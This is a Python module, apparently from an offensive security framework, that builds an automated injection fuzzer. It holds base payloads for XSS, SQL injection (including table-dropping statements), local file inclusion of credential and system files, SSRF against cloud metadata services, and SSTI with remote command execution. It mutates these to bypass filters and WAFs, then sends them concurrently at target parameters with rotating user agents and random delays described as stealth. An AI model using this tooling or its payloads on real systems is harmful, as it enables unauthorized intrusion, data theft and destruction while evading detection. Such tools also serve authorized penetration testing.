# shadowfox/agents/replay_manager.py

import requests
import asyncio
import aiohttp
import time
import random
import json
import logging
from typing import Dict, List, Any, Optional, Callable
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from enum import Enum

class PayloadType(Enum):
    XSS = "XSS"
    SQLI = "SQLi"
    LFI = "LFI"
    RFI = "RFI"
    SSRF = "SSRF"
    SSTI = "SSTI"
    XXE = "XXE"
    JWT = "JWT"
    NOSQLI = "NoSQLi"
    LDAP = "LDAP"

@dataclass
class ReplayRequest:
    """Struktura za replay zahtev"""
    url: str
    method: str = "GET"
    headers: Dict[str, str] = None
    data: Dict[str, Any] = None
    json_data: Dict[str, Any] = None
    params: Dict[str, str] = None
    cookies: Dict[str, str] = None
    timeout: int = 10
    allow_redirects: bool = True
    verify_ssl: bool = False

@dataclass
class ReplayResponse:
    """Struktura za replay odgovor"""
    status_code: int
    headers: Dict[str, str]
    content: str
    response_time: float
    final_url: str
    payload_used: str
    payload_type: str
    success_indicators: List[str]
    error_indicators: List[str]

class MutationEngine:
    """
    Generiše mutirane payload-e za različite tipove napada
    """
    
    def __init__(self):
        self.logger = logging.getLogger('MutationEngine')
        self._load_base_payloads()
        self.mutation_techniques = {
            'case_variation': self._case_mutation,
            'encoding': self._encoding_mutation,
            'comment_injection': self._comment_mutation,
            'concatenation': self._concat_mutation,
            'bypass_filters': self._bypass_mutation
        }
    
    def _load_base_payloads(self):
        """Učitava bazne payload-e za svaki tip napada"""
        self.base_payloads = {
            PayloadType.XSS: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "\"><script>alert('XSS')</script>",
                "<iframe src=\"javascript:alert('XSS')\">",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>"
            ],
            PayloadType.SQLI: [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "'; DROP TABLE users; --",
                "' UNION SELECT 1,2,3 --",
                "' AND (SELECT COUNT(*) FROM users) > 0 --",
                "'; WAITFOR DELAY '00:00:05' --",
                "' OR SLEEP(5) --",
                "' OR 1=1 LIMIT 1 --",
                "\"; DROP TABLE users; --"
            ],
            PayloadType.LFI: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd%00",
                "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/var/log/apache2/access.log",
                "/proc/self/environ",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                "/etc/passwd\x00"
            ],
            PayloadType.SSRF: [
                "http://localhost:80",
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "gopher://127.0.0.1:3306",
                "http://localhost:6379",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://[::1]:80",
                "http://0x7f000001:80",
                "http://2130706433:80"
            ],
            PayloadType.SSTI: [
                "{{7*7}}",
                "${7*7}",
                "{{config}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{%for x in ().__class__.__base__.__subclasses__()%}{%if \"warning\" in x.__name__%}{{x()._module.__builtins__['__import__']('os').system(\"ls\")}}{%endif%}{%endfor%}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "${T(java.lang.Runtime).getRuntime().exec('calc')}",
                "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
                "#set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('calc')",
                "{{lipsum.__globals__.os.popen('id').read()}}"
            ]
        }
    
    def generate_mutations(self, payload_type: PayloadType, count: int = 50) -> List[str]:
        """Generiše mutirane payload-e"""
        base_payloads = self.base_payloads.get(payload_type, [])
        if not base_payloads:
            return []
        
        mutations = []
        
        for _ in range(count):
            # Izaberi random base payload
            base = random.choice(base_payloads)
            
            # Primeni random mutation tehnike
            mutated = base
            techniques_to_apply = random.sample(
                list(self.mutation_techniques.keys()), 
                random.randint(1, 3)
            )
            
            for technique in techniques_to_apply:
                mutated = self.mutation_techniques[technique](mutated, payload_type)
            
            mutations.append(mutated)
        
        # Dodaj i originalne payload-e
        mutations.extend(base_payloads)
        
        return list(set(mutations))  # Ukloni duplikate
    
    def _case_mutation(self, payload: str, payload_type: PayloadType) -> str:
        """Case variation mutacije"""
        if random.choice([True, False]):
            return payload.upper()
        elif random.choice([True, False]):
            return payload.lower()
        else:
            # Mixed case
            return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
    
    def _encoding_mutation(self, payload: str, payload_type: PayloadType) -> str:
        """Encoding mutacije"""
        encodings = [
            lambda x: x.replace('<', '%3C').replace('>', '%3E'),  # URL encoding
            lambda x: x.replace('<', '&lt;').replace('>', '&gt;'),  # HTML encoding
            lambda x: x.replace("'", '%27').replace('"', '%22'),  # Quote encoding
            lambda x: x.replace(' ', '%20'),  # Space encoding
            lambda x: x.replace('<', '\\u003c').replace('>', '\\u003e')  # Unicode
        ]
        
        encoding = random.choice(encodings)
        return encoding(payload)
    
    def _comment_mutation(self, payload: str, payload_type: PayloadType) -> str:
        """Comment injection mutacije"""
        if payload_type == PayloadType.SQLI:
            comments = ['/**/', '/*comment*/', '--', '#']
            comment = random.choice(comments)
            # Ubaci komentar na random poziciju
            pos = random.randint(0, len(payload))
            return payload[:pos] + comment + payload[pos:]
        elif payload_type == PayloadType.XSS:
            # HTML komentari u XSS
            return payload.replace('<', '<!--><').replace('>', '><!-->')
        
        return payload
    
    def _concat_mutation(self, payload: str, payload_type: PayloadType) -> str:
        """Concatenation mutacije"""
        if payload_type == PayloadType.SQLI:
            # SQL concatenation
            parts = payload.split("'")
            if len(parts) > 1:
                return "'||'".join(parts)
        elif payload_type == PayloadType.XSS:
            # JavaScript concatenation
            if 'alert' in payload:
                return payload.replace('alert', 'eval("al"+"ert")')
        
        return payload
    
    def _bypass_mutation(self, payload: str, payload_type: PayloadType) -> str:
        """Filter bypass mutacije"""
        bypass_techniques = {
            'script': ['ScRiPt', 'sCrIpT', 'scr<x>ipt', 'scr\nipt'],
            'union': ['UniOn', 'un/**/ion', 'un\x00ion'],
            'select': ['sElEcT', 'sel/**/ect', 'se\nlect'],
            'alert': ['al\x00ert', 'al/**/ert', 'eval(atob("YWxlcnQ="))']
        }
        
        result = payload
        for keyword, bypasses in bypass_techniques.items():
            if keyword in result.lower():
                bypass = random.choice(bypasses)
                result = result.replace(keyword, bypass)
        
        return result

class ReplayManager:
    """
    Glavni ReplayManager koji integriše Mutation Engine sa network slanjem
    """
    
    def __init__(self, operator):
        self.operator = operator
        self.logger = logging.getLogger('ReplayManager')
        self.mutation_engine = MutationEngine()
        self.session = requests.Session()
        
        # Stealth konfiguracija
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        # Success/Error indicators za različite tipove napada
        self.success_indicators = {
            PayloadType.XSS: ['<script', 'javascript:', 'onerror=', 'onload='],
            PayloadType.SQLI: ['syntax error', 'mysql_fetch', 'ORA-', 'PostgreSQL', 'sqlite_'],
            PayloadType.LFI: ['root:', '/bin/bash', 'www-data', '[boot loader]'],
            PayloadType.SSRF: ['Connection refused', 'timeout', 'metadata', 'internal']
        }
        
        self.error_indicators = {
            PayloadType.XSS: ['blocked', 'filtered', 'sanitized'],
            PayloadType.SQLI: ['blocked', 'waf', 'injection detected'],
            PayloadType.LFI: ['access denied', 'file not found', 'permission denied']
        }
    
    def replay_attack(self, base_request: ReplayRequest, payload_type: PayloadType, 
                     target_params: List[str] = None, mutation_count: int = 50,
                     delay_range: tuple = (1, 3), concurrent_limit: int = 5) -> List[ReplayResponse]:
        """
        Glavna funkcija za replay napade sa mutacijama
        """
        self.logger.info(f"Počinje replay napad: {payload_type.value} na {base_request.url}")
        
        # Generiši mutirane payload-e
        payloads = self.mutation_engine.generate_mutations(payload_type, mutation_count)
        
        # Ako nisu specificirani target parametri, pokušaj da ih automatski detektuješ
        if not target_params:
            target_params = self._detect_injectable_params(base_request)
        
        if not target_params:
            self.logger.warning("Nisu pronađeni parametri za injection")
            return []
        
        self.logger.info(f"Generirano {len(payloads)} payload-a za {len(target_params)} parametara")
        
        responses = []
        
        # Async izvršavanje zahteva
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            responses = loop.run_until_complete(
                self._execute_async_requests(
                    base_request, payloads, target_params, 
                    payload_type, delay_range, concurrent_limit
                )
            )
        finally:
            loop.close()
        
        # Analiziraj odgovore i pronađi potencijalne uspehe
        successful_responses = self._analyze_responses(responses, payload_type)
        
        # Loguj rezultate
        self.operator.log_agent_action("ReplayManager", "replay_completed", {
            "payload_type": payload_type.value,
            "total_requests": len(responses),
            "successful_responses": len(successful_responses),
            "target_params": target_params
        })
        
        self.logger.info(f"Replay završen. {len(successful_responses)}/{len(responses)} potencijalnih pogodaka")
        
        return responses
    
    async def _execute_async_requests(self, base_request: ReplayRequest, payloads: List[str],
                                    target_params: List[str], payload_type: PayloadType,
                                    delay_range: tuple, concurrent_limit: int) -> List[ReplayResponse]:
        """Async izvršavanje zahteva"""
        semaphore = asyncio.Semaphore(concurrent_limit)
        connector = aiohttp.TCPConnector(verify_ssl=base_request.verify_ssl, limit=100)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            
            for payload in payloads:
                for param in target_params:
                    task = self._send_async_request(
                        session, semaphore, base_request, 
                        payload, param, payload_type, delay_range
                    )
                    tasks.append(task)
            
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Filtriraj greške
            valid_responses = [r for r in responses if isinstance(r, ReplayResponse)]
            
            return valid_responses
    
    async def _send_async_request(self, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore,
                                base_request: ReplayRequest, payload: str, target_param: str,
                                payload_type: PayloadType, delay_range: tuple) -> ReplayResponse:
        """Pošalje pojedinačni async zahtev"""
        async with semaphore:
            # Random delay za stealth
            delay = random.uniform(*delay_range)
            await asyncio.sleep(delay)
            
            # Pripremi zahtev sa payload-om
            request_data = self._prepare_request_with_payload(base_request, payload, target_param)
            
            # Random User-Agent
            headers = request_data.get('headers', {})
            headers['User-Agent'] = random.choice(self.user_agents)
            
            start_time = time.time()
            
            try:
                async with session.request(
                    method=base_request.method,
                    url=request_data['url'],
                    headers=headers,
                    data=request_data.get('data'),
                    json=request_data.get('json'),
                    params=request_data.get('params'),
                    cookies=request_data.get('cookies'),
                    timeout=aiohttp.ClientTimeout(total=base_request.timeout),
                    allow_redirects=base_request.allow_redirects
                ) as response:
                    
                    content = await response.text()
                    response_time = time.time() - start_time
                    
                    return ReplayResponse(
                        status_code=response.status,
                        headers=dict(response.headers),
                        content=content,
                        response_time=response_time,
                        final_url=str(response.url),
                        payload_used=payload,
                        payload_type=payload_type.value,
                        success_indicators=[],
                        error_indicators=[]
                    )
                    
            except Exception as e:
                self.logger.debug(f"Request failed: {e}")
                return ReplayResponse(
                    status_code=0,
                    headers={},
                    content=str(e),
                    response_time=time.time() - start_time,
                    final_url=base_request.url,
                    payload_used=payload,
                    payload_type=payload_type.value,
                    success_indicators=[],
                    error_indicators=[]
                )
    
    def _detect_injectable_params(self, request: ReplayRequest) -> List[str]:
        """Automatski detektuje parametre koji mogu biti injectable"""
        injectable_params = []
        
        # URL parametri
        if request.params:
            injectable_params.extend(request.params.keys())
        
        # POST data parametri
        if request.data:
            if isinstance(request.data, dict):
                injectable_params.extend(request.data.keys())
        
        # JSON parametri (jedan nivo dubine)
        if request.json_data:
            injectable_params.extend(request.json_data.keys())
        
        # Query string iz URL-a
        parsed_url = urlparse(request.url)
        if parsed_url.query:
            query_params = parse_qs(parsed_url.query)
            injectable_params.extend(query_params.keys())
        
        return list(set(injectable_params))
    
    def _prepare_request_with_payload(self, base_request: ReplayRequest, 
                                    payload: str, target_param: str) -> Dict:
        """Priprema zahtev sa ubačenim payload-om"""
        request_data = {
            'url': base_request.url,
            'headers': base_request.headers.copy() if base_request.headers else {},
            'data': base_request.data.copy() if base_request.data else None,
            'json': base_request.json_data.copy() if base_request.json_data else None,
            'params': base_request.params.copy() if base_request.params else None,
            'cookies': base_request.cookies.copy() if base_request.cookies else None
        }
        
        # Ubaci payload u odgovarajući parametar
        if request_data['params'] and target_param in request_data['params']:
            request_data['params'][target_param] = payload
        elif request_data['data'] and isinstance(request_data['data'], dict) and target_param in request_data['data']:
            request_data['data'][target_param] = payload
        elif request_data['json'] and target_param in request_data['json']:
            request_data['json'][target_param] = payload
        else:
            # Pokušaj sa URL query parametrima
            parsed_url = urlparse(base_request.url)
            query_params = parse_qs(parsed_url.query)
            if target_param in query_params:
                query_params[target_param] = [payload]
                new_query = urlencode(query_params, doseq=True)
                request_data['url'] = urlunparse(parsed_url._replace(query=new_query))
        
        return request_data
    
    def _analyze_responses(self, responses: List[ReplayResponse], 
                         payload_type: PayloadType) -> List[ReplayResponse]:
        """Analizira odgovore i identifikuje potencijalne uspehe"""
        successful_responses = []
        
        success_patterns = self.success_indicators.get(payload_type, [])
        error_patterns = self.error_indicators.get(payload_type, [])
        
        for response in responses:
            content_lower = response.content.lower()
            
            # Proveri success indikatore
            found_success = []
            for pattern in success_patterns:
                if pattern.lower() in content_lower:
                    found_success.append(pattern)
            
            # Proveri error indikatore
            found_errors = []
            for pattern in error_patterns:
                if pattern.lower() in content_lower:
                    found_errors.append(pattern)
            
            response.success_indicators = found_success
            response.error_indicators = found_errors
            
            # Smatraj uspešnim ako ima success indikatore ili neobične status kodove
            if (found_success or 
                response.status_code in [500, 403, 404] and payload_type == PayloadType.SQLI or
                len(response.content) > 10000 or  # Neobično veliki odgovor
                response.response_time > 5.0):  # Sporiji odgovor (možda time-based injection)
                
                successful_responses.append(response)
                
                # Sačuvaj kao dokaz
                if self.operator.current_mission_id:
                    self.operator.store_proof(
                        payload=response.payload_used,
                        url=response.final_url,
                        payload_type=response.payload_type,
                        response_code=response.status_code,
                        response_raw=response.content[:5000]  # Ograniči veličinu
                    )
        
        return successful_responses

# Test funkcionalnost
if __name__ == "__main__":
    from shadowfox.core.operator import ShadowFoxOperator
    
    # Test setup
    op = ShadowFoxOperator()
    replay_manager = ReplayManager(op)
    
    # Test mutation engine
    mutations = replay_manager.mutation_engine.generate_mutations(PayloadType.XSS, 10)
    print("XSS Mutations:")
    for i, mutation in enumerate(mutations[:5], 1):
        print(f"{i}. {mutation}")
    
    # Test replay (koristiti safe test URL)
    test_request = ReplayRequest(
        url="https://httpbin.org/get",
        method="GET",
        params={"test": "value"}
    )
    
    mission_id = op.create_mission("https://httpbin.org", "Test replay misija")
    responses = replay_manager.replay_attack(
        test_request, 
        PayloadType.XSS, 
        target_params=["test"],
        mutation_count=3,
        concurrent_limit=2
    )
    
    print(f"\nTest završen. Poslano {len(responses)} zahteva")
    for resp in responses[:2]:
        print(f"Status: {resp.status_code}, Payload: {resp.payload_used[:50]}...")
